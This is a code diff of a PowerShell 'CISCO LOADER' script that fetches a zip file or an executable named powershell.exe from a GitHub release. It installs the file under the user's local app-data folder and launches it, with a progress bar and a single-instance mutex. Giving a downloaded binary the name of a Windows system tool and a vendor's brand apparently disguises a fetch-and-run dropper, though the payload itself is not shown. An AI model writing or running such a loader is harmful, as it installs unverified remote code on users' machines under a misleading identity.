@@ -15,11 +15,11 @@ catch {
 }
 
 # ==========================================================
-# CISCO PURE GREEN BAR LOADER
+# CISCO PURE GREEN LOADER
 # Repo    : https://github.com/Wxyuz/CISCO
-# Script  : P.ps
 # Release : v1.0.0
-# Asset   : powershell.exe
+# Primary : CISCO.zip
+# Fallback: powershell.exe
 # ==========================================================
 
 $AppTitle = "CISCO LOADER"
@@ -28,10 +28,12 @@ $RepoOwner = "Wxyuz"
 $RepoName = "CISCO"
 $TagName = "v1.0.0"
 
-$ReleaseAssetName = "powershell.exe"
-$LocalExeName = "powershell.exe"
+$PrimaryAssetName = "CISCO.zip"
+$FallbackAssetName = "powershell.exe"
+$GuiExeName = "powershell.exe"
 
-$DownloadUrl = "https://github.com/$RepoOwner/$RepoName/releases/download/$TagName/$ReleaseAssetName"
+$PrimaryDownloadUrl = "https://github.com/$RepoOwner/$RepoName/releases/download/$TagName/$PrimaryAssetName"
+$FallbackDownloadUrl = "https://github.com/$RepoOwner/$RepoName/releases/download/$TagName/$FallbackAssetName"
 
 function Get-SafeLocalAppData {
     if (![string]::IsNullOrWhiteSpace($env:LOCALAPPDATA)) {
@@ -47,10 +49,14 @@ function Get-SafeLocalAppData {
 
 $InstallRoot = Join-Path (Get-SafeLocalAppData) "Wxyuz"
 $InstallDir = Join-Path $InstallRoot "CISCO"
-$OutFile = Join-Path $InstallDir $LocalExeName
-$TempFile = "$OutFile.download"
+$GuiPath = Join-Path $InstallDir $GuiExeName
+$TempDir = Join-Path $InstallRoot "CISCO_TEMP"
+$TempZip = Join-Path $TempDir $PrimaryAssetName
+$TempExe = Join-Path $TempDir $FallbackAssetName
 
-$LoaderMutexName = "Wxyuz_CISCO_Pure_Green_Loader_v1_0_0"
+$LoaderMutexName = "Global\Wxyuz_CISCO_LOADER_MUTEX_v1_0_0"
+$GuiMutexFile = Join-Path $InstallDir "gui.lock"
+
 $LoaderMutex = $null
 $LoaderMutexCreated = $false
 
@@ -81,12 +87,17 @@ function Initialize-Console {
 
     try {
         $RawUi = $Host.UI.RawUI
-        $Size = $RawUi.BufferSize
-        $Size.Width = 90
-        $RawUi.BufferSize = $Size
+        $BufferSize = $RawUi.BufferSize
+
+        if ($BufferSize.Width -lt 90) {
+            $BufferSize.Width = 90
+            $RawUi.BufferSize = $BufferSize
+        }
     }
     catch {
     }
+
+    Show-GreenBar -Percent 0
 }
 
 function Restore-Console {
@@ -144,10 +155,8 @@ function Show-GreenBar {
     }
 
     $Empty = $BarWidth - $Filled
-
     $Block = [string][char]0x2588
     $Space = " "
-
     $Bar = "[" + ($Block * $Filled) + ($Space * $Empty) + "]"
 
     try {
@@ -324,7 +333,7 @@ function Restore-AppWindow {
 }
 
 function Get-RunningGuiProcesses {
-    $TargetPath = Normalize-PathSafe $OutFile
+    $TargetPath = Normalize-PathSafe $GuiPath
     $Result = New-Object System.Collections.ArrayList
 
     try {
@@ -383,12 +392,48 @@ function Restore-RunningGui {
     }
 }
 
-function Remove-TempFile {
-    if (Test-Path -LiteralPath $TempFile) {
+function Remove-PathSafe {
+    param(
+        [string]$Path
+    )
+
+    if (Test-Path -LiteralPath $Path) {
         try {
-            Remove-Item -LiteralPath $TempFile -Force
+            Remove-Item -LiteralPath $Path -Recurse -Force
         }
         catch {
+        }
+    }
+}
+
+function Test-UrlExists {
+    param(
+        [string]$Url
+    )
+
+    $Request = $null
+    $Response = $null
+
+    try {
+        $Request = [System.Net.HttpWebRequest]::Create($Url)
+        $Request.Method = "HEAD"
+        $Request.AllowAutoRedirect = $true
+        $Request.MaximumAutomaticRedirections = 10
+        $Request.UserAgent = "Mozilla/5.0 CISCO-Loader"
+        $Request.Timeout = 15000
+        $Response = $Request.GetResponse()
+        return $true
+    }
+    catch {
+        return $false
+    }
+    finally {
+        if ($null -ne $Response) {
+            try {
+                $Response.Close()
+            }
+            catch {
+            }
         }
     }
 }
@@ -399,7 +444,11 @@ function Invoke-DownloadFileWithGreenBar {
         [string]$Url,
 
         [Parameter(Mandatory = $true)]
-        [string]$Destination
+        [string]$Destination,
+
+        [int]$StartPercent,
+
+        [int]$EndPercent
     )
 
     $Request = $null
@@ -407,8 +456,12 @@ function Invoke-DownloadFileWithGreenBar {
     $InputStream = $null
     $OutputStream = $null
 
+    if ($EndPercent -le $StartPercent) {
+        $EndPercent = $StartPercent + 1
+    }
+
     try {
-        Show-GreenBar -Percent 0
+        Show-GreenBar -Percent $StartPercent
 
         $Request = [System.Net.HttpWebRequest]::Create($Url)
         $Request.Method = "GET"
@@ -432,7 +485,7 @@ function Invoke-DownloadFileWithGreenBar {
         $TotalBytes = [Int64]$Response.ContentLength
         $TotalRead = [Int64]0
         $Buffer = New-Object byte[] 65536
-        $UnknownPercent = 0
+        $UnknownPercent = $StartPercent
 
         while ($true) {
             $Read = $InputStream.Read($Buffer, 0, $Buffer.Length)
@@ -445,21 +498,31 @@ function Invoke-DownloadFileWithGreenBar {
             $TotalRead += $Read
 
             if ($TotalBytes -gt 0) {
-                $Percent = [int](($TotalRead * 100) / $TotalBytes)
-                Show-GreenBar -Percent $Percent
+                $LocalPercent = [int](($TotalRead * 100) / $TotalBytes)
+
+                if ($LocalPercent -lt 0) {
+                    $LocalPercent = 0
+                }
+
+                if ($LocalPercent -gt 100) {
+                    $LocalPercent = 100
+                }
+
+                $MappedPercent = $StartPercent + [int](($LocalPercent * ($EndPercent - $StartPercent)) / 100)
+                Show-GreenBar -Percent $MappedPercent
             }
             else {
                 $UnknownPercent += 1
 
-                if ($UnknownPercent -gt 95) {
-                    $UnknownPercent = 95
+                if ($UnknownPercent -gt ($EndPercent - 1)) {
+                    $UnknownPercent = $EndPercent - 1
                 }
 
                 Show-GreenBar -Percent $UnknownPercent
             }
         }
 
-        Show-GreenBar -Percent 100
+        Show-GreenBar -Percent $EndPercent
 
         if (!(Test-Path -LiteralPath $Destination)) {
             throw "Download failed. File not created."
@@ -513,43 +576,133 @@ function Invoke-DownloadFileWithGreenBar {
     }
 }
 
-function Download-Loader {
-    Ensure-Folder -Path $InstallDir
-    Remove-TempFile
+function Expand-ZipFileSafe {
+    param(
+        [string]$ZipPath,
+        [string]$Destination
+    )
 
-    Invoke-DownloadFileWithGreenBar -Url $DownloadUrl -Destination $TempFile
+    Show-GreenBar -Percent 82
 
-    if (!(Test-Path -LiteralPath $TempFile)) {
-        throw "Download failed. Temp file not found."
+    try {
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+    }
+    catch {
     }
 
-    if (!(Test-WindowsExe -Path $TempFile)) {
+    Ensure-Folder -Path $Destination
+
+    try {
+        [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipPath, $Destination)
+    }
+    catch {
         try {
-            Remove-Item -LiteralPath $TempFile -Force
+            Expand-Archive -LiteralPath $ZipPath -DestinationPath $Destination -Force
         }
         catch {
+            throw $_
         }
+    }
 
+    Show-GreenBar -Percent 92
+}
+
+function Install-FromZip {
+    Ensure-Folder -Path $InstallRoot
+    Remove-PathSafe -Path $TempDir
+    Ensure-Folder -Path $TempDir
+
+    Invoke-DownloadFileWithGreenBar `
+        -Url $PrimaryDownloadUrl `
+        -Destination $TempZip `
+        -StartPercent 1 `
+        -EndPercent 80
+
+    if (!(Test-Path -LiteralPath $TempZip)) {
+        throw "Zip file not found after download."
+    }
+
+    if (Test-AnyRunningGui) {
+        Restore-RunningGui
+        Close-LoaderWindow
+    }
+
+    Remove-PathSafe -Path $InstallDir
+    Ensure-Folder -Path $InstallDir
+
+    Expand-ZipFileSafe -ZipPath $TempZip -Destination $InstallDir
+
+    if (!(Test-Path -LiteralPath $GuiPath)) {
+        throw "GUI EXE not found in extracted zip: $GuiExeName"
+    }
+
+    if (!(Test-WindowsExe -Path $GuiPath)) {
+        throw "Extracted GUI is not a valid Windows EXE."
+    }
+
+    Remove-PathSafe -Path $TempDir
+    Show-GreenBar -Percent 96
+}
+
+function Install-FromSingleExe {
+    Ensure-Folder -Path $InstallRoot
+    Remove-PathSafe -Path $TempDir
+    Ensure-Folder -Path $TempDir
+    Ensure-Folder -Path $InstallDir
+
+    Invoke-DownloadFileWithGreenBar `
+        -Url $FallbackDownloadUrl `
+        -Destination $TempExe `
+        -StartPercent 1 `
+        -EndPercent 88
+
+    if (!(Test-Path -LiteralPath $TempExe)) {
+        throw "EXE file not found after download."
+    }
+
+    if (!(Test-WindowsExe -Path $TempExe)) {
         throw "Downloaded file is not a valid Windows EXE."
     }
 
-    if (Test-Path -LiteralPath $OutFile) {
+    if (Test-AnyRunningGui) {
+        Restore-RunningGui
+        Close-LoaderWindow
+    }
+
+    if (Test-Path -LiteralPath $GuiPath) {
         try {
-            Remove-Item -LiteralPath $OutFile -Force
+            Remove-Item -LiteralPath $GuiPath -Force
         }
         catch {
-            throw "Cannot replace old file because GUI is still running or locked."
+            throw "Cannot replace old GUI because it is still running or locked."
         }
     }
 
-    Move-Item -LiteralPath $TempFile -Destination $OutFile -Force
+    Move-Item -LiteralPath $TempExe -Destination $GuiPath -Force
 
-    if (!(Test-Path -LiteralPath $OutFile)) {
-        throw "Final EXE file not found."
+    if (!(Test-Path -LiteralPath $GuiPath)) {
+        throw "Final GUI EXE not found."
     }
 
-    if (!(Test-WindowsExe -Path $OutFile)) {
-        throw "Final file is not a valid Windows EXE."
+    if (!(Test-WindowsExe -Path $GuiPath)) {
+        throw "Final GUI is not a valid Windows EXE."
+    }
+
+    Remove-PathSafe -Path $TempDir
+    Show-GreenBar -Percent 96
+}
+
+function Install-GuiFiles {
+    if (Test-AnyRunningGui) {
+        Restore-RunningGui
+        Close-LoaderWindow
+    }
+
+    if (Test-UrlExists -Url $PrimaryDownloadUrl) {
+        Install-FromZip
+    }
+    else {
+        Install-FromSingleExe
     }
 }
 
@@ -559,8 +712,22 @@ function Start-GuiOnce {
         return
     }
 
+    if (!(Test-Path -LiteralPath $GuiPath)) {
+        throw "GUI EXE not found."
+    }
+
+    if (!(Test-WindowsExe -Path $GuiPath)) {
+        throw "GUI file is not a valid Windows EXE."
+    }
+
+    try {
+        Set-Content -LiteralPath $GuiMutexFile -Value ([DateTime]::Now.ToString("yyyy-MM-dd HH:mm:ss")) -Force
+    }
+    catch {
+    }
+
     $StartInfo = New-Object System.Diagnostics.ProcessStartInfo
-    $StartInfo.FileName = $OutFile
+    $StartInfo.FileName = $GuiPath
     $StartInfo.WorkingDirectory = $InstallDir
     $StartInfo.UseShellExecute = $true
     $StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
@@ -583,6 +750,8 @@ function Start-GuiOnce {
     catch {
         throw $_
     }
+
+    Show-GreenBar -Percent 100
 }
 
 try {
@@ -603,8 +772,9 @@ try {
         Close-LoaderWindow
     }
 
-    Download-Loader
+    Install-GuiFiles
     Start-GuiOnce
+    Start-Sleep -Milliseconds 350
     Close-LoaderWindow
 }
 catch {
